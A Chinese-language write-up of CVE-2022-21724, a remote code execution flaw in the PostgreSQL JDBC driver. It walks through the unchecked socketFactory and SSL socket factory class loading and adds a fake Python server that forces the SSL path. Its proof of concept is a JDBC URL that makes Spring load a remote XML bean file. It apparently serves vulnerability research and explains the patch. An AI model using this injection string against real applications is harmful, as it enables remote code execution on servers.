- [CVE-2022-21724 PostgreSQL 远程代码执行](#cve-2022-21724-postgresql-远程代码执行)
  - [影响版本](#影响版本)
  - [原理分析](#原理分析)
    - [ConnectionImpl](#connectionimpl)
    - [socketFactory](#socketfactory)
    - [SSLSocketFactory](#sslsocketfactory)
  - [POC](#poc)
  - [补丁](#补丁)
# CVE-2022-21724 PostgreSQL 远程代码执行
## 影响版本
>=9.4.1208&&<42.2.25||>=42.3.0&&<42.3.2
## 原理分析
### ConnectionImpl
在org/postgresql/Driver.java#connect中对JDBC字符串做解析处理,其中各个参数和对应的值都放入了Info属性中。
![](2.png)
在org/postgresql/core/v3/ConnectionFactoryImpl.java中为Connect工厂的实现,其中调用了`SocketFactoryFactory.getSocketFactory(info)`将Info属性传入来获取`SocketFactory`。
![](3.png)
### socketFactory 
根据官方文档 [参考](https://jdbc.postgresql.org/documentation/head/connect.html#connection-parameters)
在PostgreSQL连接时支持使用指定的类来建立Socket连接,该类必须继承`javax.net.SocketFactory`类,且该类需要有无参构造函数,接受String类型参数的构造函数或者接受一个Properties 作为参数的构造函数,Properties中包括了该类所需要的参数列表。  

![](1.png)
socketFactory：要使用的socketFactory类.
socketFactoryArg：socketFactory类的参数.

在`getSocketFactory`中,根据info中socketFactory的值来获取类名然后又调用`ObjectFactory`来生成对象。
![](4.png)
在`ObjectFactory`中则通过Class.forName获取到对应的Class和对应的构造器,然后调用构造器newInstance直接实例化了对象。
![](5.png)
整个过程并没有检验指定的socketFactory类是否继承了`javax.net.SocketFactory`并实现了相关接口，所以只要找一个可访问并带String参数构造器的类，其中构造器内执行了危险操作即可利用。
### SSLSocketFactory
和socketFactory一样，主要用于创建指定SSL Socket连接的类,socketFactory关键字被ban的情况下可以尝试使用SSLSocketFactory。
![](img/11-25-44.png)  
区别在与触发到相关流程需要验证数据库服务端支持SSL连接，
![](img/11-27-22.png)  
![](img/11-27-38.png)  
![](img/11-28-00.png)  
可以通过伪造一个返回'S'字符的服务端，参考代码
```python
import socket

def run_server():
   # 创建TCP套接字
   server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   # 设置套接字选项，允许地址重用
   server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   
   # 绑定地址和端口
   server_address = ('', 5432)
   server_socket.bind(server_address)
   
   # 开始监听，最大连接数为5
   server_socket.listen(5)
   print(f"服务器监听在端口 {server_address[1]}")
   
   while True:
       # 接受客户端连接
       client_socket, client_address = server_socket.accept()
       print(f"接受来自 {client_address} 的连接")
       
       try:
           # 发送字符'S'到客户端
           client_socket.sendall(b'S')
       finally:
           # 关闭客户端连接
           client_socket.close()
           
if __name__ == "__main__":
   run_server()    
```
## POC
以org.springframework.context.support.ClassPathXmlApplicationContext类为例,其中构造函数支持从给定的xml地址加载Bean对象。

```java
        DriverManager.getConnection("jdbc:postgresql://127.0.0.1/test?user=test&password=123456&socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:8082/exp.xml");
```
![](6.png)
## 补丁
在调用`ObjectFactory`时传入SocketFactory类,在`ObjectFactory`中检验了继承关系。
![](7.png)
![](8.png)